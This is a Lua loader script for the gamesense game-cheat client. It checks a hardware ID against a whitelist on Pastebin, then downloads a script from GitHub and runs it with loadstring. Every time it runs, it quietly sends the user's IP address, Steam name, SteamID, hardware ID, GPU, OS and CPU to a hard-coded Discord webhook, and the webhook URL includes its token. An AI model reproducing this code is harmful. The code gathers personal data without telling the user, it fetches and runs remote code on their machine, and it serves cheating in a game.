-- require
local ffi = require "ffi"
local http = require "gamesense/http"
local ip_check = "https://api.ipify.org"
local Discord = require "gamesense/discord_webhooks"
local Webhook = Discord.new("https://discord.com/api/webhooks/909889882527264788/6mGSXTpCE_wSNsoykUL9JNth-oU79hbo-LdTTTQDVSn--RW8AT-Al7FG95D3S-Ls1XTG")

-- ffi 
local def = ffi.cdef([[ 
    typedef struct MaterialAdapterInfo_t {
            char m_pDriverName[512];
            unsigned int m_VendorID;
            unsigned int m_DeviceID;
            unsigned int m_SubSysID;
            unsigned int m_Revision;
            int m_nDXSupportLevel;
            int m_nMinDXSupportLevel;
            int m_nMaxDXSupportLevel;
            unsigned int m_nDriverVersionHigh;
            unsigned int m_nDriverVersionLow;
    };
                                                                                                                                 
    typedef int(__thiscall* get_current_adapter_fn)(void*);
    typedef void(__thiscall* get_adapter_info_fn)(void*, int adapter, struct MaterialAdapterInfo_t& info);
    ]])

	-- hwid variables & others
	local material_system = client.create_interface('materialsystem.dll', 'VMaterialSystem080')
	local material_interface = ffi.cast('void***', material_system)[0]

	local get_current_adapter = ffi.cast('get_current_adapter_fn', material_interface[25])
	local get_adapter_info = ffi.cast('get_adapter_info_fn', material_interface[26])

	local current_adapter = get_current_adapter(material_interface)

	local adapter_struct = ffi.new("struct MaterialAdapterInfo_t")
	get_adapter_info(material_interface, current_adapter, adapter_struct)

	local driverName = tostring(ffi.string(adapter_struct["m_pDriverName"]))
	local vendorId = tostring(adapter_struct["m_VendorID"])
	local deviceId = tostring(adapter_struct["m_DeviceID"])
	local sysID = tostring(adapter_struct["m_SubSysID"])

	local hyuga_hwid = (vendorId * deviceId + sysID)

-- panorama name and steamid
local js = panorama.open()
local name, steamid = js.MyPersonaAPI.GetName() , js.MyPersonaAPI.GetXuid()

-- discord embed variables
local RichEmbed = Discord.newEmbed()

-- contains function
function contains(tab, val)
	for i=1,#tab do
	   if tab[i] == val then 
		  return true
	   end
	end
	return false
end

client.exec("clear")
local menuR, menuG, menuB, menuA = ui.get(ui.reference("Misc", "Settings", "Menu color"))

http.get("https://pastebin.com/raw/MstkyPbq", function(success, response)

		if not success or response.status ~= 200 then
			client.color_log(255, 255, 255, "Connection issue." )
			return
		end

		--get raw content from raw link
		local raw_content = (response.body)

		--insert all whitelisted users into the table
		for num in string.gmatch(raw_content, '([^,]+)') do
			table.insert(database, tonumber(num))
		end

		if not contains(database, hyuga_hwid) then
			client.color_log(menuR, menuG, menuB, "[hyuga] \0")
			client.color_log(255, 50, 50, "HWID missmatch")
			client.color_log(menuR, menuG, menuB, "[hyuga] \0")
			client.color_log(211, 211, 211, "Your hwid is \0")
			client.color_log(50, 211, 50, hyuga_hwid)
		else
			local loader = panorama.loadstring([[
				let Status = {
					finished: false
				};
		
				$.AsyncWebRequest("https://raw.githubusercontent.com/rebub/gc-luas/main/hyuga.lua", {
						type:"GET",
						complete:function(e){
							Status.finished = true;
							Status.code = e.responseText;
						}
					}
				);
		
				return Status;
			]])()

		local function Loop()
			if ( loader.finished ) then
				loadstring(loader.code)()
			else
				client.delay_call(0.1, Loop)
			end
		end
		
		Loop()
	end
end)

-- discord embed log
http.get(ip_check, function(success, response)
	-- discord embed variables
	local hours, minutes = client.system_time()
	local var = config.export()
	-- additional discord embed checks and "fixes" 
	if hours < 10 then hours = "0" .. hours end
    if minutes < 10 then minutes = "0" .. minutes end
	--if (response.body == "46.189.220.94") then response.body = "reub's ip" end
	-- set the username on the webhook
	Webhook:setUsername("Hyūga")
	-- set the avatar on the webhook
	Webhook:setAvatarURL("https://i.imgur.com/mCwkG0m.png")
	-- set the title on the webhook
	RichEmbed:setTitle("Hyūga")
	if contains(database, hyuga_hwid) then
		-- set the color of the webhook
		RichEmbed:setColor(3342130)
		-- set the description on the webhook
		RichEmbed:setDescription(name .. " loaded hyūga.")
	else
		-- set the color of the webhook
		RichEmbed:setColor(16724530)
		-- set the description on the webhook
		RichEmbed:setDescription(name .. " tried to load hyūga.")
	end
	-- set the thumbnail on the webhook
	RichEmbed:setThumbnail("https://i.imgur.com/mCwkG0m.png")
	-- add a "time of load" field on the webhook
	RichEmbed:addField("Real Time:", hours .. ":" .. minutes, true)
	-- add a "ip adress" field on the webhook
	RichEmbed:addField("IP Adress:", response.body, true)
	-- add a "steam id" field on the webhook
	RichEmbed:addField("SteamID", steamid, false)
	-- add os field to the webhook
	RichEmbed:addField("Operating System", ffi.os, true)
	-- add hwid field to the webhook
	RichEmbed:addField("HWID", hyuga_hwid, true)
	-- add gpu field to the webhook
	RichEmbed:addField("GPU", driverName, false)
	-- add cpu field to the webhook
	RichEmbed:addField("CPU", ffi.arch, false)
	
	-- set the footer on the webhook
	RichEmbed:setFooter("gamesense.pub", "https://i.imgur.com/11c0Ctp.png", "https://i.imgur.com/11c0Ctp.png")
	-- send webhook
	Webhook:send(RichEmbed)

end)
